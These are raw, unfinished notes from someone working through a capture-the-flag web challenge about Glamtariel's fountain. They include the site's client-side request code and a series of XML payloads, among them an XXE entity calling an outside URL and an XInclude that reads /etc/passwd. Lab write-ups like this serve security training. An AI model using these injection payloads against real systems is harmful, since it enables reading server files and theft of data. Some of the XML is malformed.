Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.

you can drag elements to Glamtariel and the fountain

#1 tamper cookie

---
Moving stuff around: TRAFFIC FLIEs
Kringle > Glamtariel: TAMPER
Kringle > Fountain: TAMPER (cookie recipie)
Cane > Glamtariel: nothing interesting
Cane > Fountain: nothing interesting
Ice > Glamtariel: nothing interesting
Ice > Fountain: nothing interesting
Elf > Glamtarie: PATH
Boat > Glamatariel: nothing
Boat > Fountain: TYPE
Star > either: nothing
Cave > Glamtariel: nothing
Cave > Fountain: Fake tickets? Snacks that don't taste right (reference to snack guid and ticket at bottom of screen...)
Ring > Glamatariel: mentions collection
Ring > Fountain: PATH. APP. Ring options changed. Eye appears. "click away that ominous eye"

Ring 1 > "SIMPLE FORMAT" for all rings
Ring 2 > "i don't have a silver ring", mentions RINGLIST
Ring 3 > likes red one. might be more responsive if we ask differently
Ring 4 > nothing

opened new drag options...


type of ring: image/png


req.send(JSON.stringify({imgDrop: 'img1', who: 'princess', reqType: 'json'}));



// Ajax request for dropped image
function drop_ajax() {
	var origToken = document.getElementById('csrf').content;
	var reqToken = document.getElementById("ticket").value;
	var origDomain = document.domain;
	var origCookie = "MiniLembanh=" + lunch + ";domain=" + origDomain;
	var req = new XMLHttpRequest();
	document.cookie = "MiniLembanh=" + document.getElementById("snack").value + "." + lunch.substring(37) + ";domain=" + origDomain;
		req.onreadystatechange = function() {
			if(this.readyState == 4) {
				resp=JSON.parse(this.responseText);
				const jStatus = req.status;
				const jContentType =req.getResponseHeader("Content-Type");
					if(((jStatus == 200) || (jStatus == 400)) && jContentType == 'application/json') { 
						jResponse();
					}
					else {
						textP = "Sorry, I didn\'t understand that.";
						textF = "Sorry, I didn\'t understand that.";
						princessBubble(ctx, textP, 12, "black", poetic);
						fountainBubble(ctx, textF, 12, "black", poetic);
					}
				//Reset ticket value in case it was altered
				document.getElementById("ticket").value = origToken;
				document.getElementById("ticket").innerHTML = origToken;
				//Reset cookie value in case it was altered
				document.cookie = origCookie
				document.getElementById("snack").value = lunch.substring(0,36);
				document.getElementById("snack").innerHTML = lunch.substring(0,36);
			}
		  	else {
				//No action for other readyState values
          	}
        }
        req.open('POST', '/dropped', true);
        req.setRequestHeader("Content-Type", "application/json");
		req.setRequestHeader('Accept', 'application/json');
		req.setRequestHeader("X-Grinchum", reqToken);
        req.send(JSON.stringify({imgDrop: draggedImg, who: droppedOn, reqType: 'json'}));
	} 


ring?to path. and app

Ticket is the CSRF token
reqtoken starts the same

lunch is the 'snack' + another string
37 chars

why am i doing this by hand
opening burp and starting again

setting req type to xml:
"We don't speak that way very often any more. Once in a while perhaps, but only at certain times.^I don't hear her use that very often. I think only for certain TYPEs of thoughts."




<?xml version="1.0" encoding="UTF-8" ?>
<root>
	<imgDrop>img1</imgDrop>
	<who>princess</who>
	<reqType>json</reqType>
</root>



<?xml version="1.0">
<root>
	<imgDrop>img1</imgDrop>
	<who>princess</who>
	<reqType>json</reqType>
</root>


change application/json to application/xml
<?xml version="1.0">
<root>
	<imgDrop>img1</imgDrop>
	<who>princess</who>
	<reqType>xml</reqType>
</root>


<?xml version="1.0">
<root>
<imgDrop>img1</imgDrop>
<who>princess</who>
<reqType>xml</reqType>
</root>

s


<?xml version="1.0">
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://blakebourgeois.com"> ]>
<root>
<imgDrop>&xxe</imgDrop>
<who>princess</who>
<reqType>xml</reqType>
</root>

<?xml version="1.0">
<root>
<imgDrop xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>img1</imgDrop>
<who>princess</who>
<reqType>xml</reqType>

"imgDrop":"img1","who":"fountain","reqType":"json"

bottom left to glam and fountain switch options
talkin about TYPE


grey ring needs to be dropped somewhere specifically probably

RINGLIST file
glam keeps a list of all rings in a ringlist.